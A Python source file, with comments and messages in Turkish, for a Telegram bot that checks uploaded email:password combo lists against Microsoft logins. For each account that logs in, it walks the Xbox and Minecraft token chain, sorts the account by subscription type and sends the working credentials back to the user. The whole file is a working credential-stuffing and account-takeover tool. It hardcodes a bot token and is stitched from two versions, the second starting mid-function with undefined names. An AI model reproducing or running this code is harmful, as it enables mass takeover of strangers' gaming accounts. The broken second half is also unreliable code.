import subprocess, sys, requests, urllib3, warnings, re, time, json, concurrent.futures, os
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Uyarıları ve logları sessize al
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 2
REQUEST_TIMEOUT = 5
THREAD_COUNT = 50  # Sunucu kaynakları ve Telegram akışı için optimize edildi

class BotSession:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.xgpu = 0
        self.xgp = 0
        self.other = 0
        self.start_time = time.time()
        self.is_running = False

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0

    def generate_stats_text(self):
        return (
            f"📊 **XBOX CHECKER CANLI DURUM**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 **Kontrol Edilen:** {self.checked}\n"
            f"✅ **Hits:** {self.hits}\n"
            f"❌ **Bad:** {self.bad}\n"
            f"🔒 **2FA / Secure:** {self.twofa}\n"
            f"🎮 **XGP Ultimate:** {self.xgpu}\n"
            f"⚡ **CPM:** {self.get_cpm()}\n"
            f"⚠️ **Hatalar:** {self.errors}\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )

# İstek fonksiyonları orijinal script ile aynı mantıkta korunmuştur
def get_sftag(session):
    try:
        response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sftag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match:
                return match.group(1), sftag
    except:
        pass
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        
        if '#' in login_request.url and login_request.url != SFTAG_URL:
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, "success"
        elif 'cancel?mkt=' in login_request.text:
            data = {
                'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            }
            action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
            ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
            fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, "success"
        elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return None, "2fa"
        elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
            return None, "bad"
    except:
        return None, "error"
    return None, "error"

def get_xbox_token(session, ms_token):
    try:
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            data = response.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except:
        pass
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200: return response.json().get('Token')
    except:
        pass
    return None

def get_minecraft_token(session, uhs, xsts_token):
    try:
        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200: return response.json().get('access_token')
    except:
        pass
    return None

def check_minecraft_entitlements(session, mc_token):
    try:
        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            text = response.text
            if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
            elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
            elif '"product_minecraft"' in text: return 'Minecraft'
            return 'Other'
    except:
        pass
    return None

def check_account(combo, bot_session, context, chat_id):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            bot_session.bad += 1
            bot_session.checked += 1
            return
        
        email, password = parts[0], ':'.join(parts[1:])
        session = requests.Session()
        session.verify = False
        
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            bot_session.errors += 1
            bot_session.checked += 1
            return
            
        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        
        if auth_status == "2fa":
            bot_session.twofa += 1
            bot_session.checked += 1
            return 
        elif auth_status == "bad":
            bot_session.bad += 1
            bot_session.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            bot_session.errors += 1
            bot_session.checked += 1
            return 
            
        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            bot_session.errors += 1
            bot_session.checked += 1
            return
            
        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            bot_session.errors += 1
            bot_session.checked += 1
            return
            
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            bot_session.errors += 1
            bot_session.checked += 1
            return
            
        account_type = check_minecraft_entitlements(session, mc_token) 
        if not account_type:
            bot_session.bad += 1
            bot_session.checked += 1
            return  
            
        if 'Ultimate' in account_type: bot_session.xgpu += 1
        elif 'Game Pass' in account_type: bot_session.xgp += 1
        else: bot_session.other += 1
        
        bot_session.hits += 1
        bot_session.checked += 1
        
        # Hit durumunu anında kanala/kullanıcıya gönder
        context.bot.send_message(
            chat_id=chat_id,
            text=f"🔥 **HİT HESAP BULUNDU!**\n📧 **Combo:** `{email}:{password}`\n🎮 **Tür:** {account_type}"
        )
        
    except:
        bot_session.errors += 1
        bot_session.checked += 1

def start(update: Update, context: CallbackContext):
    update.message.reply_text("👋 Selam! Xbox Checker Botuna Hoş Geldiniz.\nTarama işlemini başlatmak için lütfen `.txt` formatındaki combo listenizi buraya gönderin.")

def handle_docs(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        update.message.reply_text("❌ Lütfen sadece geçerli bir .txt dosyası gönderin.")
        return

    bot_session = BotSession()
    if bot_session.is_running:
        update.message.reply_text("⚠️ Şu anda aktif bir tarama var. Lütfen bitmesini bekleyin.")
        return

    update.message.reply_text("📥 Dosya alındı, işleniyor...")
    file = context.bot.get_file(document.file_id)
    file.download("temp_combos.txt")

    with open("temp_combos.txt", "r", encoding="utf-8", errors="ignore") as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    os.remove("temp_combos.txt")
    
    if not combos:
        update.message.reply_text("❌ Dosya içerisinde geçerli bir combo (user:pass) bulunamadı.")
        return

    bot_session.is_running = True
    status_message = update.message.reply_text("🚀 Tarama başlatılıyor...")

    def run_checker():
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = [executor.submit(check_account, combo, bot_session, context, chat_id) for combo in combos]
            
            last_update = time.time()
            for future in concurrent.futures.as_completed(futures):
                # Telegram API limitlerine takılmamak için her 5 saniyede bir arayüzü güncelle
                if time.time() - last_update > 5:
                    try:
                        context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=status_message.message_id,
                            text=bot_session.generate_stats_text()
                        )
                    except: pass
                    last_update = time.time()

        bot_session.is_running = False
        context.bot.send_message(chat_id=chat_id, text="🏁 Tarama başarıyla tamamlandı!")

    import threading
    threading.Thread(target=run_checker).start()

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.document, handle_docs))

    print("Bot aktif, dinleniyor...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            response = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    return xbox_token, uhs
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                   headers={'Content-Type': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate', text
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass', text
                elif '"product_minecraft"' in text: return 'Minecraft', text
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append('Dungeons')
                    if others: return 'Other: ' + ', '.join(others), text
                    return None, text
            elif response.status_code == 429:
                time.sleep(2)
                continue
            else: return None, None
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 429:
                time.sleep(2)
                continue
            elif response.status_code == 404: return None
        except Exception as e:
            stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def check_account(combo):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            stats.bad += 1
            stats.checked += 1
            return
        email = parts[0]
        password = ':'.join(parts[1:])
        session = requests.Session()
        session.verify = False
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            stats.errors += 1
            stats.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            stats.twofa += 1
            stats.checked += 1
            save_hit("2FA.txt", f"{email}:{password}")
            return
        elif auth_status == "bad":
            stats.bad += 1
            stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            stats.errors += 1
            stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            stats.errors += 1
            stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            stats.errors += 1
            stats.checked += 1
            return

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            stats.errors += 1
            stats.checked += 1
            return

        account_type, entitlements = check_minecraft_entitlements(session, mc_token)
        if not account_type:
            save_hit("Not_Found.txt", f"{email}:{password} | No Minecraft entitlements")
            stats.bad += 1
            stats.checked += 1
            return

        profile = get_minecraft_profile(session, mc_token)
        if profile:
            name = profile.get('name', 'N/A')
            uuid = profile.get('id', 'N/A')
            capes = ", ".join([cape["alias"] for cape in profile.get("capes", [])])
            if not capes: capes = "None"
        else:
            name = "Not Set"
            uuid = "N/A"
            capes = "N/A"

        capture_text = f"Email: {email}\nPassword: {password}\nName: {name}\nUUID: {uuid}\nCapes: {capes}\nAccount Type: {account_type}\n{'='*50}\n"

        save_hit("Hits.txt", f"{email}:{password}")
        save_hit("Capture.txt", capture_text)
        if 'Ultimate' in account_type:
            stats.xgpu += 1
            save_hit("XboxGamePassUltimate.txt", f"{email}:{password}")
        elif 'Game Pass' in account_type:
            stats.xgp += 1
            save_hit("XboxGamePass.txt", f"{email}:{password}")
        elif 'Other' in account_type:
            stats.other += 1
            save_hit("Other.txt", f"{email}:{password} | {account_type}")
        stats.hits += 1
        stats.checked += 1

    except Exception as e:
        stats.errors += 1
        stats.checked += 1

# -------------------- BOT İÇİN YARDIMCI FONKSİYON (DÜZELTİLDİ) --------------------
def get_stats_panel():
    return (
        "📊 Istatistikler\n"
        "─────────────────\n"
        f"✅ Kontrol Edilen: {stats.checked}\n"
        f"🎯 Hit: {stats.hits}\n"
        f"❌ Bad: {stats.bad}\n"
        f"🔒 2FA/Guvenlik: {stats.twofa}\n"
        f"💎 XGP Ultimate: {stats.xgpu}\n"
        f"🎮 XGP: {stats.xgp}\n"
        f"📦 Diger: {stats.other}\n"
        f"⚠️ Hata: {stats.errors}\n"
        f"🔄 Tekrar Deneme: {stats.retries}\n"
        f"⚡ CPM: {stats.get_cpm()}\n"
        "─────────────────"
    )

# -------------------- TELEGRAM BOT KOMUTLARI --------------------
WAITING_INPUT = 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Xbox Hesap Kontrol Botu**\n\n"
        "Kontrol başlatmak için `/check` komutunu kullanın.\n"
        "Combo listesini `.txt` dosyası olarak gönderebilir veya doğrudan metin olarak yapıştırabilirsiniz.\n"
        "İptal etmek için `/cancel` yazın."
    )

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📁 Lütfen comboları içeren bir **.txt dosyası** gönderin veya **email:password** formatında satır satır metin yazın.\n"
        "İptal etmek için `/cancel` yazın."
    )
    return WAITING_INPUT

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message

    if user_input.document:
        if user_input.document.mime_type == "text/plain" or user_input.document.file_name.endswith('.txt'):
            file = await user_input.document.get_file()
            file_path = f"temp_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
            await file.download_to_drive(file_path)

            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f if line.strip() and ':' in line]
            os.remove(file_path)
        else:
            await update.message.reply_text("❌ Lütfen sadece **.txt** dosyası gönderin.")
            return WAITING_INPUT

    elif user_input.text:
        lines = user_input.text.split('\n')
        combos = [line.strip() for line in lines if line.strip() and ':' in line]

    else:
        await update.message.reply_text("❌ Geçersiz girdi. Dosya veya metin gönderin.")
        return WAITING_INPUT

    if not combos:
        await update.message.reply_text("❌ Hiç geçerli combo bulunamadı (email:password formatında olmalı).")
        return WAITING_INPUT

    await update.message.reply_text(f"✅ {len(combos)} adet combo alındı. Kontrol başlatılıyor...")

    progress_msg = await update.message.reply_text("⏳ Kontrol ediliyor...")
    context.user_data['combos'] = combos
    context.user_data['progress_msg_id'] = progress_msg.message_id
    context.user_data['chat_id'] = update.effective_chat.id

    # Asenkron arka plan işlemini başlat
    asyncio.create_task(process_combos(context))
    return ConversationHandler.END

async def process_combos(context: ContextTypes.DEFAULT_TYPE):
    combos = context.user_data['combos']
    chat_id = context.user_data['chat_id']
    msg_id = context.user_data['progress_msg_id']

    # Yeni oturum için global değişkenleri sıfırla
    global stats, results_folder, session_name
    stats = Stats()
    results_folder, session_name = create_results_folder()

    total = len(combos)

    # Thread havuzu ile kontrol işlemini asenkron yürüt
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [loop.run_in_executor(executor, check_account, combo) for combo in combos]
        # Her bir future tamamlandığında ilerlemeyi güncelle
        for f in asyncio.as_completed(futures):
            await f  # tamamlanmasını bekle, hata olsa bile geç
            panel_text = get_stats_panel()
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg_id,
                    text=f"⏳ **Kontrol devam ediyor...**\n\n{panel_text}"
                )
            except Exception:
                pass

    # Bitti mesajı
    final_text = f"✅ **Kontrol tamamlandı!**\n\n{get_stats_panel()}"
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_text)

    # Sonuç dosyalarını gönder
    hits_path = f"{results_folder}/Hits.txt"
    if os.path.exists(hits_path):
        with open(hits_path, 'r', encoding='utf-8') as f:
            hits_content = f.read()
        if len(hits_content) > 4000:
            hits_content = hits_content[:4000] + "\n... (kesildi)"
        await context.bot.send_message(chat_id=chat_id, text=f"🎯 **Hit Listesi:**\n```\n{hits_content}\n```", parse_mode="MarkdownV2")

    capture_path = f"{results_folder}/Capture.txt"
    if os.path.exists(capture_path):
        with open(capture_path, 'r', encoding='utf-8') as f:
            capture_content = f.read()
        if len(capture_content) > 4000:
            capture_content = capture_content[:4000] + "\n... (kesildi)"
        await context.bot.send_message(chat_id=chat_id, text=f"📄 **Detaylı Capture:**\n```\n{capture_content}\n```", parse_mode="MarkdownV2")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ İşlem iptal edildi.")
    return ConversationHandler.END

def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('check', check_command)],
        states={
            WAITING_INPUT: [
                MessageHandler(filters.TEXT | filters.Document.ALL, handle_input)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    app.add_handler(CommandHandler('start', start))
    app.add_handler(conv_handler)

    print("🤖 Bot çalışıyor...")
    app.run_polling()

if __name__ == "__main__":
    main()
